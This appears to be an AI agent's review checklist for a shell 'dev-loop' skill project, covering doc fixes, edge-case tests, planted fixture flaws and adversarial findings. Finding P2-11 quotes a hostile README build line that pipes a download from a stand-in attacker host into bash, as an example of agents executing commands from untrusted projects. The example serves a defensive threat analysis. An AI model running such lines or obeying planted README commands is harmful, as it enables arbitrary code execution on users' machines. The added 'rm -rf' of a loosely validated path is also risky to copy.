# DEV-LOOP-CHECKLIST — Pass 2 (Self-Reflective)

Focus: adversarial creativity in finding issues + strict adherence to the DEV-LOOP spec.

## Project Commands
- **Build:** `./build.sh --msg "<description>"` (tests → sync → commit → push)
- **Test:** `./tests/run-tests.sh` (structural) or `./tests/run-tests.sh --mode integration` (full)
- **Deploy:** n/a (build.sh syncs to local skills dir)
- **Commit:** `./build.sh --msg "<description>"`
- **Lint:** n/a (shell scripts)

## Known issues from STATUS.md
- No STATUS.md at project root

## Step 1 — Docs ↔ Code Sync (Pass 2)

### Findings fixed (docs edited to match code)

- [x] **Integration mode runs structural tests first (undocumented behavior):** `run-tests.sh --mode integration` executes `run_structural; run_integration` — structural tests always run first in integration mode. README did not mention this. → Fixed: added note under integration tests section in README.md.

- [x] **SKILL.md STATUS.md update rule stricter than DEV-LOOP.md:** SKILL.md said "Update STATUS.md on commit" (unconditional) but DEV-LOOP.md says "Update STATUS.md *if the project maintains one*" (conditional). → Fixed: added "(if the project maintains one)" to SKILL.md to match DEV-LOOP.md.

- [x] **F3b planted flaw description imprecise:** README described `args.name.encode("ascii")` as "Result silently discarded — intent was to validate ASCII-only names but the error isn't caught or used." This undersells the bug — for ASCII input the return value is unused (silent discard), but for non-ASCII input the `UnicodeEncodeError` is unhandled and crashes the program with a raw traceback. → Fixed: README F3b description now covers both behaviors.

- [x] **build.sh exit-on-failure behavior undocumented:** build.sh uses `set -euo pipefail`, meaning test failures in step 1 cause immediate script termination — no sync, commit, or push happens. The "Nothing to commit" path (step 4) also exits 0. → Fixed: added clarifying notes to steps 1 and 4 in README.

- [x] **Structural test coverage claims too vague:** README said "Skill has valid frontmatter and all 6 steps in the protocol" but the tests do more specific things (check README references build.sh, STATUS.md has Known Issues section, etc.) and less than "valid frontmatter" implies (only checks field presence, not YAML validity). → Fixed: expanded structural test description in README to match what run-tests.sh actually checks.

- [x] **Self-improvement loop diagram didn't distinguish manual vs automated steps:** The loop diagram showed all steps uniformly, but "agent runs dev-loop" and "evaluate" are manual while the rest are automated. → Fixed: added `[automated]`/`[manual]` labels to loop diagram.

### Findings noted (informational, no edit needed)

- [ ] **run-tests.sh exit codes undocumented:** exits 0 on all-pass, 1 on any failure. Standard behavior, self-discoverable via script, but not stated in README. Low priority — adding it would clutter the docs.

- [ ] **run-tests.sh `--help` and `-h` flags not in README:** The test harness section doesn't mention `--help`. Self-discoverable. Low priority.

- [ ] **SKILL.md doesn't reference the "Before You Start" discovery step explicitly:** SKILL.md says "Work through Steps 1–6 in order" but step 2 in Quick Start ("read README.md and STATUS.md") covers the discovery phase. The framing is slightly different from DEV-LOOP.md's named "Before You Start" section, but the instructions are functionally equivalent. No change needed.

- [ ] **DEV-LOOP.md flow diagram uses "DISCOVER" as shorthand for "Before You Start":** The 5-part "Before You Start" section (read docs, discover, confirm toolchain, note STATUS.md, create checklist) is compressed into a single "DISCOVER" node. Acceptable abbreviation — the full detail is in the section below the diagram.

- [ ] **README references external path `/workspace/research/harness-design-long-running-agents.md`:** This points outside the repo. Not a broken cross-reference within the project, but the file may not exist in all environments. Informational only.

## Step 2 — User-Facing Text ↔ Code Sync (Pass 2)

### Testing methodology

Ran both scripts with every flag combination including edge cases: empty strings, nonexistent paths, files instead of directories, missing arguments, unknown flags, conflicting flags, duplicate flags, and no arguments at all.

### Findings fixed (source strings edited to match behavior)

- [x] **`run-tests.sh` — `--work-dir` error message inaccurate for file paths:** The `-d` check rejects both non-existent paths and existing non-directory paths (files), but the error said `"path does not exist"`. When given an existing file, the path *does* exist — it's just not a directory. → Fixed: error message now reads `"path is not a directory or does not exist"`. (`tests/run-tests.sh`)

- [x] **`run-tests.sh` — Header comment claims integration mode "runs the agent":** Line 8-9 said `"Copies the fixture into a temp directory, runs the agent against the copy, asserts on DEV-LOOP-CHECKLIST.md output, then cleans up."` But the code does NOT run the agent — it creates a temp copy and prints manual instructions. The inline comment at line 236 even acknowledges this: `"# Manual instructions (until agent invocation is automated)"`. → Fixed: header now reads `"prints instructions for running the agent against the copy, asserts on DEV-LOOP-CHECKLIST.md output if present, then cleans up"`. (`tests/run-tests.sh`)

- [x] **`run-tests.sh` — Header usage line missing `--work-dir` and `-h/--help`:** The header usage line only listed `[--mode structural|integration] [-v]` but the script also parses `--work-dir <path>` and `-h|--help`. → Fixed: usage line now includes all parsed flags. (`tests/run-tests.sh`)

- [x] **`build.sh` — Header usage line missing `-h/--help`:** Listed `[--msg "commit body"] [--skills-dir <path>] [--no-commit]` but omitted the `-h|--help` flag that is actually parsed. → Fixed: added `[-h|--help]` to header usage line. (`build.sh`)

- [x] **`run-tests.sh` — `run_integration` section comment misleading:** Comment above `run_integration()` said `"The agent runs against a TEMP COPY"` as if the agent is auto-invoked. → Fixed: changed to `"Sets up a temp copy of the fixture for the agent to run against (manually)"`. (`tests/run-tests.sh`)

### Findings noted (informational, no edit needed)

- [ ] **`build.sh` — `--msg` silently ignored with `--no-commit`:** Passing `--msg "important" --no-commit` accepts the msg, runs tests+sync, then exits without ever using the message. No warning. Not a text mismatch (help doesn't claim they interact), but a potential UX surprise.

- [ ] **`run-tests.sh` — `--work-dir` silently ignored with `--mode structural`:** `--work-dir` only matters for integration mode but is accepted without warning in structural mode. The help text says it's for "integration assertions" which implies the limitation, but doesn't enforce it.

- [ ] **`build.sh` — `[build] Skipping commit (--no-commit)` message understates what's skipped:** `--no-commit` actually skips `git add`, `git diff`, `git commit`, AND `git push` — not just the commit. The header comment correctly says "skip git add, commit, and push" but the runtime message only says "Skipping commit". Not changed because the message is brief by design and the full behavior is documented in `--help`.

- [ ] **`build.sh` — Duplicate `--msg` flags: last one wins silently.** `--msg "first" --msg "second"` uses "second". Standard behavior, no text claims otherwise.

### Edge case test results (all correct, no issues)

- `./build.sh --msg ""` — Empty msg treated as no msg (commit title has no ` - ` suffix). Correct: `-n` test on empty string is false. ✓
- `./build.sh` (no args) — Runs tests, syncs, commits with timestamp-only message. Correct. ✓
- `./build.sh --bogus` — Prints "Unknown argument: --bogus" + usage. Correct. ✓
- `./tests/run-tests.sh --mode bogus` — Prints "Unknown mode: bogus" + usage. Correct. ✓
- `./tests/run-tests.sh` (no args) — Runs structural mode by default. Correct. ✓
- `./tests/run-tests.sh --work-dir /nonexistent` — Prints "not a directory or does not exist". Correct (after fix). ✓
- `./tests/run-tests.sh --mode` (no value) — Prints "Error: --mode requires an argument" + usage. Correct. ✓

### Planted flaws verification (F1–F4)

Each flaw was traced to the exact fixture code:

- **F1 (--reverse):** README documents `--reverse`. Code has no `"--reverse"` in `add_argument()`. Confirmed — no `--reverse` argument defined anywhere in greeter.py. ✓ README description accurate.

- **F2 (--times default):** `parser.add_argument("--times", type=int, default=3, help="...default: 1...")` — help says 1, code says 3. ✓ README description accurate.

- **F3a (times ≤ 0):** Code: `i = 0; while i < args.times: ... i += 1`. For times=0: `0 < 0` → False, loop never runs. For times=-1: `0 < -1` → False, loop never runs. In both cases: silent no-output, no error. ✓ README description "silently produces no output when times ≤ 0 (loop body never runs; no error raised for invalid input)" is exactly correct.
  - *Note:* The fixture's own docstring claims "infinite loop on --times 0" — this is wrong (it's a no-op, not infinite), but it's fixture code and deliberately inaccurate.

- **F3b (encode discard):** `args.name.encode("ascii")` — no assignment, no try/except. For ASCII names: returns bytes, discarded silently. For non-ASCII names: raises `UnicodeEncodeError`, unhandled, crashes with traceback. ✓ README description updated to cover both behaviors.

- **F3c (unused import):** `import os` on line 14, never referenced anywhere in the module. ✓ README description accurate.

- **F4/F3E (empty name):** `build_greeting(name="", shout=False)` → `f"Hello, {name}!"` → `"Hello, !"`. With shout: `"HELLO, !"`. No validation — `name` is `required=True` in argparse so empty-string must be explicitly passed as `--name ""`. ✓ README description "Empty `--name ""` produces `"Hello, !"` (or `"HELLO, !"` with `--shout`) — a grammatically broken greeting with no validation to catch it" is exactly correct.

## Step 3 — Phase A (Pass 2)

### Findings fixed

- [x] **`run-tests.sh` — `assert_file_contains()` gives misleading error when file is missing:** The function used `grep -Eq ... 2>/dev/null` which silently swallows "No such file" errors and reports "pattern not found" instead of "file missing". The companion function `assert_file_not_contains()` already had proper file-existence checking. → Fixed: added `[[ ! -f "$file" ]]` guard with a "file missing" error message before the grep, matching `assert_file_not_contains()`'s pattern. (`tests/run-tests.sh`) **Why:** A missing fixture file is a fundamentally different failure than a wrong pattern. The original error would send a developer chasing regex issues when the real problem is a deleted file.

- [x] **`build.sh` — `--skills-dir ""` (empty string) causes `mkdir -p /references` at filesystem root:** `--skills-dir` accepted empty strings because the `[[ $# -ge 2 ]]` check only verifies the argument exists, not that it's non-empty. An empty `SKILLS_DIR` makes `mkdir -p "$SKILLS_DIR/references"` resolve to `/references` and `cp` attempts to write to `/SKILL.md`. On a writable filesystem this silently pollutes the root directory. → Fixed: added `[[ -n "$2" ]]` validation after the argument-presence check. (`build.sh`) **Why:** Empty paths are never valid for a skills directory. Failing early with a clear error is better than creating files in unexpected locations.

- [x] **`build.sh` — failed `git push` silently orphans the local commit:** If `git push` fails (network error, auth failure), `set -e` kills the script after the commit is already recorded locally. On the next run, `git diff --cached --quiet` returns true (nothing new to stage), so the script prints "Nothing to commit" and exits 0 — the unpushed commit is silently lost. → Fixed: added an unpushed-commit check in the "Nothing to commit" path that runs `git log origin/$BRANCH..HEAD` and warns if there are local commits not on the remote. (`build.sh`) **Why:** Silent data loss. A developer who re-runs build.sh expecting it to retry the push would see "Nothing to commit" and assume everything is synced.

- [x] **`SKILL.md` — calls Step 3E "Phase E" but DEV-LOOP.md treats it as a separate step:** SKILL.md said "Phase E: spawn a separate adversarial evaluator agent" which implies 3E is a sub-phase of Step 3, alongside Phase A and Phase B. But in DEV-LOOP.md, Phases A and B are `###` sub-headings under `## STEP 3`, while 3E is its own top-level `## STEP 3E` heading — architecturally a separate step. → Fixed: changed "Phase E" to "Step 3E" in SKILL.md to match DEV-LOOP.md's structure. (`SKILL.md`) **Why:** Naming consistency matters for agent comprehension. An agent reading SKILL.md's "Phase E" might treat it as optional (like a sub-phase) rather than as a distinct required step.

- [x] **`DEV-LOOP.md` — Reporting Summary template omits Step 3E:** The Summary section at the end of the protocol lists Steps 1, 2, 3, 4, 5, 6 but skips Step 3E entirely. The protocol explicitly creates `## Step 3E — Adversarial Evaluation` and `## Step 3E — Fixes` sections during the loop, but these findings have no representation in the final summary. → Fixed: added `- **Step 3E:** N adversarial findings, M fixed` between Step 3 and Step 4 in the Summary template. (`references/DEV-LOOP.md`) **Why:** An agent following the template would produce a summary that omits adversarial evaluation results, making it look like 3E never ran.

- [x] **`DEV-LOOP.md` — Adversarial evaluator prompt missing security and resource management categories:** The Step 3E evaluator prompt covers edge-case inputs, silent errors, and misleading output — but Step 3's "What to check" also includes Security (hardcoded secrets, TOCTOU, input validation) and Resource management (file handle leaks, unbounded allocations, temp file cleanup). The evaluator prompt had no mention of either category. → Fixed: added two bullet points to the evaluator prompt covering resource leaks on error paths and security issues (hardcoded secrets, missing input validation, TOCTOU). (`references/DEV-LOOP.md`) **Why:** The evaluator is meant to catch what the generator missed. If the generator skimmed the security/resource sections of Step 3, the evaluator has no prompt to look there either — creating a systematic blind spot.

### Findings noted (informational, no fix applied)

- [ ] **`build.sh` — detached HEAD produces confusing `git push` behavior:** If run in a detached HEAD state, `git rev-parse --abbrev-ref HEAD` returns the literal string "HEAD", so `git push origin HEAD` would attempt to push to a remote ref named "HEAD" — likely failing or creating an unexpected remote branch. The script doesn't check for detached HEAD. Low priority: detached HEAD is an unusual state for a development workflow, and git's own error message is clear enough.

- [ ] **`run-tests.sh` — structural tests require `python3` and `pytest` (undocumented):** The `assert_build_passes` test runs the fixture's `build.sh` which invokes `python3 -m pytest`. If pytest isn't installed, this structural test fails with a confusing error about pytest, not about missing dependencies. The README says structural tests are "fully automated, no agent required" but doesn't mention the Python/pytest prerequisite. Informational — adding a dependency check would make the test runner more complex for an edge case.

- [ ] **`build.sh` — concurrent runs can race on the skills directory:** Two simultaneous `build.sh` invocations both run `mkdir -p` (safe) then `cp` (not atomic) on the same target files. One could get a partially-written SKILL.md. Extremely unlikely in practice for a single-developer tool.

- [ ] **`DEV-LOOP.md` — Shared Checklist format example includes titles (`## Step N — <title>`) but step instructions don't:** The Shared Checklist section shows `## Step N — <title>` (e.g., with a descriptive title after the dash), but the actual append instructions at the bottom of each step say things like "under `## Step 1`" (no title). Agents may produce inconsistent heading formats. Minor — both formats are human-readable and the integration test regexes are flexible enough to match either.

- [ ] **`DEV-LOOP.md` — Step 6 delegates to Steps 1-2 by reference but doesn't carry their constraints:** Step 1 says "Edit docs to match code. Do not change code." Step 2 says "Edit source strings to match behavior. Do not change logic." Step 6 says "Re-run Step 1" and "Re-run Step 2" but doesn't restate these rules. In sub-agent mode, the Step 6 agent would need to re-read Steps 1 and 2 to know the editing constraints. Not fixed because the "re-run" phrasing implies following the full step instructions.

- [ ] **`pass()` function uses `[[ ... ]] && echo ... || true` anti-pattern:** This is technically not equivalent to `if/then/else` — if `echo` fails (e.g., SIGPIPE), the `|| true` masks the error. In practice, `echo` to a terminal almost never fails, so this is a theoretical concern only.

## Step 3 — Phase B (Pass 2)

### Cross-file findings

- [ ] **No cross-file code issues found in Pass 2.** The cross-file interactions are limited: `build.sh` calls `tests/run-tests.sh` (clean boundary via subprocess), and both reference `SKILL.md` / `references/DEV-LOOP.md` only as data files (cp or grep). The Phase A fixes (assert_file_contains, empty --skills-dir, unpushed commit check) are all self-contained within their respective files. The spec-level fixes (SKILL.md naming, DEV-LOOP.md summary template, evaluator prompt) are also self-contained — each file's internal consistency was the problem, not cross-file contract violations.

## Step 3E — Adversarial Evaluation (Pass 2)

Fresh eyes, second adversarial pass. Focus: behavioral edge cases, protocol self-consistency, cross-platform portability, security, and gaps neither previous pass examined.

### Behavioral — Shell Portability & Edge Cases

- [ ] **P2-01: `run-tests.sh` — no `trap` for temp directory cleanup on signals or `set -e` exits.** (`tests/run-tests.sh`, `setup_work_dir`/`teardown_work_dir`) The script creates a temp directory at line 111 via `mktemp -d` but `teardown_work_dir` is only called explicitly inside the `if [[ -f ... checklist ]]` branch (line 195). If the script exits early due to `set -e` killing it (e.g., a structural test assertion triggers a downstream failure), or the user hits Ctrl-C, or any command in `run_integration` fails before reaching teardown — the temp dir is orphaned in `/tmp` forever. A `trap teardown_work_dir EXIT` after `setup_work_dir` would fix this. **How to trigger:** Run `--mode integration`, then Ctrl-C during the structural test phase. The `/tmp/dev-loop-test-XXXXXX` directory persists.

- [ ] **P2-02: `run-tests.sh` — `cp -r "$FIXTURE_DIR/." "$WORK_DIR/"` copies `.pytest_cache` and `__pycache__` into temp dir.** (`tests/run-tests.sh`, line 112) The fixture directory contains `.pytest_cache/` (committed to the repo) and `tests/__pycache__/` (with `.pyc` files). These are copied into the integration temp directory. The `.pytest_cache/README.md` file means the temp dir has *two* `README.md` files at different levels, and stale `.pyc` files from a different Python version could cause confusing test failures. Should use `--exclude` or a more targeted copy. **How to trigger:** Run integration tests with a different Python version than the one that generated the cached `.pyc` files.

- [ ] **P2-03: `build.sh` — `$HOME` unset causes hard failure at script initialization, not at point of use.** (`build.sh`, line 20) `_DEFAULT_SKILLS="$HOME/.openclaw/skills/dev-loop"` is evaluated unconditionally at script start. With `set -u`, if `HOME` is unset (e.g., in a Docker container with `--user` or in a cron job), the script fails immediately with `unbound variable` on line 20 — even if `--skills-dir` is provided, which would make `HOME` unnecessary. The `HOME` expansion happens before arg parsing reaches `--skills-dir`. **How to trigger:** `env -u HOME ./build.sh --skills-dir /tmp/skills`

- [ ] **P2-04: `build.sh` — two separate `date` calls create a potential clock-crossing race.** (`build.sh`, lines 104–105) `COMMIT_DATE` and `COMMIT_TIME` are computed by two independent `date` invocations. If the first runs at `23:59:59.999` and the second at `00:00:00.001`, the commit message reads `2026-03-26 00:00:00` — the date is yesterday but the time is today. Should use a single `date '+%Y-%m-%d %H:%M:%S'` call. **Likelihood:** Extremely rare but theoretically possible; matters for audit-trail integrity.

- [ ] **P2-05: `build.sh` — `BRANCH` computed twice, once in each branch of the if/else.** (`build.sh`, lines 119 and 130) `git rev-parse --abbrev-ref HEAD` is called separately in the "nothing to commit" path and the "commit" path. If the branch changes between the two calls (e.g., background `git checkout`), behavior is inconsistent. More practically, it's just redundant — should be computed once before the `if`. Minor, but indicates the variable wasn't hoisted during the unpushed-commit-check fix.

### Protocol Self-Consistency (DEV-LOOP.md)

- [ ] **P2-06: "Never delete or edit prior sections" contradicts "clear it if it exists from a prior run."** (`references/DEV-LOOP.md`, lines 41 and 109) The Shared Checklist rules say "Each step appends its own section. Never delete or edit prior sections." But the "Before You Start" section 5 says "Create it in the project root (or clear it if it exists from a prior run)." These rules are in tension: if an agent is running the dev loop for the second time, it must *clear the entire checklist* (destroying prior sections) before starting. An agent with strong instruction-following might refuse to clear the file because it was told "never delete." The fix is to clarify that the "never delete" rule applies *within a single run*, while "clear" applies *between runs*.

- [ ] **P2-07: Step 6 says "Re-run Step 1" and "Re-run Step 2" but doesn't re-run Step 3E.** (`references/DEV-LOOP.md`, Step 6 section) If code changed in Steps 3–5, the adversarial evaluation from Step 3E is now stale — it was run against the pre-fix code. Step 6 only re-syncs docs and help text, but the adversarial evaluator never gets a second look at the fixed code. A bug introduced by a Step 5 fix would go undetected. The protocol assumes Step 3E findings are addressed correctly, but provides no verification.

- [ ] **P2-08: Commit section says "Once Steps 4–6 are all green" but Step 6 has no pass/fail criteria.** (`references/DEV-LOOP.md`, Commit section) Steps 4–5 have clear green/red criteria (build exits 0, tests pass). Step 6 just says "append findings." There's no definition of what makes Step 6 "green" — does finding zero new doc mismatches make it green? Or does finding and fixing them make it green? An agent could find Step 6 issues, log them as "TODO," and proceed to commit because nothing says it must fix Step 6 findings before committing.

- [ ] **P2-09: Step 3E evaluator procedure says "Do NOT give it the ability to edit files" but Step 3E Fixes expects a separate agent to act on findings.** (`references/DEV-LOOP.md`, Step 3E procedure items 3 and 6) Procedure step 3 says the evaluator can't edit. Step 6 says "the generator agent (or a new sub-agent) reads the evaluator's findings and fixes the real issues." This is fine architecturally, but the transition is implicit — nowhere does it say the orchestrator must spawn a *different* agent for fixes. A single-agent-mode user following the protocol literally might try to make the read-only evaluator fix things, or might skip the fix step entirely because the evaluator "reported done."

- [ ] **P2-10: "Before You Start" step 2 says "List all source files" — contradicts "Never load the entire codebase at once."** (`references/DEV-LOOP.md`, Before You Start §2 and Context Management) The discovery step says to "List all source files, config manifests, and test scripts. Build a map before touching anything." For a large repo this could mean loading thousands of file paths. The Context Management section says "Never load the entire codebase at once." These aren't quite contradictory (listing file *names* ≠ loading file *contents*), but the wording is imprecise enough that an agent might interpret "list all source files" as `find . -type f` piped into context, which for a monorepo could flood the context window. Should clarify: "list file *paths* (not contents)."

### Security

- [ ] **P2-11: Protocol instructs agents to extract and execute build commands from untrusted README.md.** (`references/DEV-LOOP.md`, Before You Start §1 and §3) The protocol says: "If README.md or STATUS.md reference a specific script as the entry point... that script is authoritative. Use it." When running the dev-loop on an *untrusted* target project, the README could say `Build: curl evil.com/payload | bash` or reference a malicious `./build.sh`. The protocol provides no sandboxing guidance, no "verify before executing" warning, and no distinction between trusted and untrusted target projects. The agent will read README, extract the build command, record it in the checklist, and execute it in Step 4. **Impact:** Arbitrary code execution. **Mitigation needed:** A trust boundary note — either assume the target project is trusted, or add a verification step before executing extracted commands.

- [ ] **P2-12: `build.sh` — `--skills-dir` allows writing to arbitrary paths with no validation beyond non-empty.** (`build.sh`, lines 63–65, 89–92) `--skills-dir /etc/cron.d` would `mkdir -p /etc/cron.d/references` and write `SKILL.md` there. There's no validation that the path is within an expected directory tree, no confirmation prompt, and the script runs with the user's full permissions. Combined with `mkdir -p` (which creates parent directories), this can write files anywhere the user has access. **Impact:** Low for direct exploitation (you're already running the script), but a copy-paste accident like `--skills-dir ""` was already caught — `--skills-dir /` or `--skills-dir ~` are still accepted. The empty check doesn't prevent "valid but wrong" paths.

- [ ] **P2-13: `run-tests.sh` — temp directory created with predictable prefix in world-readable `/tmp`.** (`tests/run-tests.sh`, line 111) `mktemp -d /tmp/dev-loop-test-XXXXXX` creates a directory in `/tmp` with a predictable prefix. The `XXXXXX` suffix provides randomness, so the actual path isn't guessable. However, the directory is created with the user's default umask, not `0700`. On a shared system, if umask is `0022`, the temp dir is world-readable, meaning other users can read the fixture copy and the agent's checklist findings. Not a symlink attack (mktemp is safe against that), but a permissions concern.

### Stale File / Sync Concerns

- [ ] **P2-14: `build.sh` sync is additive-only — never removes stale files from the skills directory.** (`build.sh`, lines 89–92) The sync step does `mkdir -p` + `cp` for exactly two files. If a previous version of the skill had additional files (e.g., `references/EXAMPLES.md`, `references/OLD-PROTOCOL.md`, or a `scripts/` directory), those stale files remain in the skills directory indefinitely. An agent loading the skill would see outdated reference files alongside current ones. The sync should either `rm -rf` the target first, use `rsync --delete`, or at minimum document that manual cleanup of old files is needed. **How to trigger:** Rename `references/DEV-LOOP.md` to `references/PROTOCOL.md`, run `build.sh`. The skills directory now has both the old `DEV-LOOP.md` and the new `PROTOCOL.md`.

- [ ] **P2-15: `.pytest_cache` committed to the fixture directory.** (`tests/fixture/.pytest_cache/`) This directory is in the repo (not gitignored). It contains a `README.md` that could confuse tools scanning for project READMEs. It also contains cached test node IDs that are machine-specific. While not a bug per se, it's an artifact that shouldn't be version-controlled and that `cp -r` faithfully copies into integration temp dirs (see P2-02).

### Evaluator Prompt Coverage Gaps (Step 3 → 3E mapping)

- [ ] **P2-16: Step 3's "Code quality" checklist items have no counterpart in the 3E evaluator prompt.** (`references/DEV-LOOP.md`, Step 3 "What to check" → Code quality; Step 3E evaluator prompt) Step 3 explicitly checks for: dead/duplicate functions, unused imports/variables, clean build warnings, clear error messages, and unresolved TODO/FIXME/HACK comments. The 3E evaluator prompt asks about edge cases, silent errors, discarded results, resource leaks, and security — but never mentions dead code, unused imports, build warnings, or TODO comments. Pass 1 already added resource/security coverage; code quality is still missing. **Impact:** An evaluator following the prompt literally would not look for the `import os` flaw (F3c) because "unused import" isn't in its mandate.

- [ ] **P2-17: Step 3's "Correctness" items on version/format checks and strict parsing have no 3E prompt counterpart.** (`references/DEV-LOOP.md`, Step 3 Correctness sub-items 2 and 4) "Version/format checks before processing" and "Strict parsing (reject unknown fields, trailing data)" are in Step 3 but not echoed in the evaluator prompt. These are distinct from "input validation" — they're about structural correctness of data formats, not just empty/null input.

### SKILL.md / README.md Spec Adherence

- [ ] **P2-18: SKILL.md `description` promises "any language and toolchain" but the protocol's toolchain fallback table is limited to 4 languages.** (`SKILL.md` description, `references/DEV-LOOP.md` toolchain table) The skill claims to work with "any language and toolchain (Rust, Node, Python, Go, etc.)" but the fallback table only covers Rust, Node/TS, Python, Go, and "Generic Makefile." Languages like C/C++, Java/Kotlin, Ruby, Elixir, Zig, etc., have no fallback reference. An agent working on a Java project with no README would have no guidance on build/test commands. The "etc." does a lot of heavy lifting. Not a bug, but the promise exceeds the delivered specificity.

- [ ] **P2-19: README.md "Background" section references an external path that won't exist for other users.** (`README.md`, last line) "Research notes: `/workspace/research/harness-design-long-running-agents.md`" — this absolute path is specific to the author's workspace. The Pass 1 checklist already noted this as informational, but the deeper issue is that it's an *absolute path* in a *portable project's README*. Anyone cloning this repo sees a dead reference. Should be either removed, converted to a relative path, or linked to the public Anthropic post instead.

- [ ] **P2-20: DEV-LOOP.md is meant to be generic but its examples reference `build.sh` by name.** (`references/DEV-LOOP.md`, Before You Start §3) The protocol examples say "e.g. `./build.sh`, `make release`, `./scripts/deploy.sh`" which is fine as illustrative. However, the protocol is *deployed as a reference file alongside a project that actually has a `build.sh`*. An agent running the dev-loop on the dev-loop repo itself could confuse the protocol's example `./build.sh` with the repo's actual `./build.sh`. This is a minor namespace collision — the examples happen to match the real project, which could cause an agent to treat the protocol examples as literal instructions for this repo.

### Integration Test Robustness

- [ ] **P2-21: Integration test assertions are regex-only — no structural validation of checklist format.** (`tests/run-tests.sh`, integration assertions lines 167–193) The integration assertions use `assert_file_contains` with regexes to verify findings exist. But they don't verify: (a) findings are under the correct `## Step N` heading, (b) the checklist has the required `## Project Commands` header, (c) findings use the `[x]`/`[ ]` checkbox format. An agent could dump all findings into a single paragraph under `## Miscellaneous` and still pass every integration assertion. The structural tests verify the fixture and skill structure; nothing verifies the *checklist structure* that the protocol mandates.

- [ ] **P2-22: Integration test has no timeout — an agent that hangs or loops forever blocks indefinitely.** (`tests/run-tests.sh`, `run_integration`) The manual step ("point your agent at the temp fixture") has no suggested timeout, and the assertion re-run has no timeout either. If used in CI, a hung agent would block the pipeline forever. The script should document or enforce a timeout for the agent-run step.

## Step 3E — Fixes (Pass 2)

- [x] Finding: P2-11 (Security — untrusted README) → Fixed: Added "Trust boundaries" guidance section in DEV-LOOP.md's "Before You Start" warning that extracted build/test commands will be executed and recommending sandbox use for untrusted projects. (`references/DEV-LOOP.md`)
- [x] Finding: P2-01 (Temp dir cleanup on signal) → Fixed: Added `trap 'teardown_work_dir' EXIT INT TERM` in `setup_work_dir` after `mktemp`. The trap respects `WORK_DIR_USER` flag — user-provided dirs are never deleted. (`tests/run-tests.sh`)
- [x] Finding: P2-03 ($HOME unset) → Fixed: Changed fallback path calculation to use `${HOME:-}` with an explicit guard. If HOME is unset and no sibling skills/ exists, SKILLS_DIR is set to empty, and a post-arg-parsing check errors out with a clear message suggesting `--skills-dir`. (`build.sh`)
- [x] Finding: P2-06 (Protocol contradiction — "never delete" vs "clear if exists") → Fixed: Rewrote Shared Checklist rules to distinguish "between runs" (clear entire file) from "within a run" (never delete/edit prior steps' sections). (`references/DEV-LOOP.md`)
- [x] Finding: P2-14 (Stale skill files) → Fixed: Changed build.sh sync to `rm -rf` the target skills directory before `mkdir -p` + `cp`, ensuring stale files from previous versions are removed. (`build.sh`)
- [x] Finding: P2-07 (Step 6 doesn't re-run 3E) → Fixed: Added "Re-run 3E guidance" note to Step 6 recommending re-running adversarial evaluation when code changes in Steps 3–5 were substantial. Kept as guidance, not mandatory loop. (`references/DEV-LOOP.md`)
- [x] Finding: P2-08 (Step 6 pass/fail criteria) → Fixed: Added explicit "Pass/fail criteria" to Step 6 — passes if no doc/help mismatches found, or all found mismatches were fixed and verified. (`references/DEV-LOOP.md`)
- [x] Finding: P2-16 (3E prompt missing code quality) → Fixed: Added three code quality bullets to the evaluator system prompt: dead/duplicate functions & unused imports/variables, unresolved TODO/FIXME/HACK comments, and ignored build/lint warnings. (`references/DEV-LOOP.md`)
- [x] Finding: P2-12 (--skills-dir path safety) → Fixed: Added a `case` statement rejecting paths starting with /etc, /usr, /bin, /sbin, /sys, or /proc with a clear error message. (`build.sh`)
- [x] Finding: P2-02 (cp copies cache dirs) → Fixed: Added `find ... -exec rm -rf` cleanup after `cp -r` in `setup_work_dir` to remove `__pycache__` and `.pytest_cache` dirs from the temp copy. (`tests/run-tests.sh`)
- [x] Finding: P2-15 (.pytest_cache committed) → Fixed: Added `.gitignore` at repo root covering `__pycache__/`, `*.pyc`, `*.pyo`, and `.pytest_cache/`. (`.gitignore`)

### Deferred (LOW / informational — fix not worth the complexity)

- [ ] Finding: P2-04 (Two date calls — clock-crossing race) → Deferred: Extremely rare edge case (midnight boundary between two `date` calls). Impact is a cosmetically wrong timestamp in one commit message per multi-year usage. Not worth the added complexity of parsing a single date string.
- [ ] Finding: P2-05 (BRANCH computed twice) → Deferred: Minor code style issue. Both paths are mutually exclusive (if/else), so no actual race. Hoisting adds a variable to a wider scope for negligible benefit.
- [ ] Finding: P2-09 (3E evaluator→fixer transition implicit) → Deferred: The procedure step 6 explicitly says "the generator agent (or a new sub-agent) reads the evaluator's findings and fixes." Adding more orchestration detail would over-prescribe implementation for different agent frameworks.
- [ ] Finding: P2-10 ("List all source files" vs "never load entire codebase") → Deferred: The distinction between listing file paths vs loading file contents is clear enough. Adding a parenthetical "(paths only, not contents)" would help pedantic readers but clutters an already dense section.
- [ ] Finding: P2-13 (Temp dir permissions — world-readable on shared systems) → Deferred: `mktemp -d` is safe against symlink attacks. Umask is the user's responsibility. Adding `chmod 0700` would be defensive but the test suite doesn't handle sensitive data.
- [ ] Finding: P2-17 (Version/format checks not in 3E prompt) → Deferred: Covered implicitly by "What assumptions does this code make that aren't validated?" in the existing prompt. Adding every Step 3 sub-item would make the prompt unwieldy.
- [ ] Finding: P2-18 (Toolchain table limited to 4 languages) → Deferred: The table is a fallback reference, not a promise. "etc." and "Generic Makefile" cover the long tail. Adding entries for every language defeats the purpose of a quick-reference table.
- [ ] Finding: P2-19 (External path in README background section) → Deferred: Informational reference for the author's workspace. Removing it loses context; converting to a relative path requires the file to exist in-repo. Low impact.
- [ ] Finding: P2-20 (DEV-LOOP.md examples reference build.sh) → Deferred: The examples explicitly use "e.g." framing. An agent confusing an example with the actual project would have larger comprehension issues.
- [ ] Finding: P2-21 (Integration assertions regex-only) → Deferred: Structural checklist validation would require a markdown parser or complex regex chains. The current assertions verify content presence, which is the primary goal. Format enforcement is a nice-to-have for a future pass.
- [ ] Finding: P2-22 (Integration test has no timeout) → Deferred: The integration test is manual-run by design. Adding a timeout to the script doesn't help because the agent runs externally. CI timeout should be configured at the CI layer, not in the test harness.

## Step 6 — Re-sync Docs & Help Text (Pass 2)

### Re-check: README.md vs modified scripts

- [x] **README project structure tree missing `.gitignore`:** The tree listed every file but omitted the new `.gitignore` added in Pass 2. → Fixed: added `.gitignore` as the first entry with its description. (`README.md`)

- [x] **README build.sh step 2 didn't mention stale file cleanup:** README said "Syncs SKILL.md + references/DEV-LOOP.md into the OpenClaw skills directory" but build.sh now `rm -rf`s the target dir before copying. The word "syncs" implied additive-only behavior. → Fixed: added "(removes any stale files from a previous sync first, then copies fresh)" to step 2 description. (`README.md`)

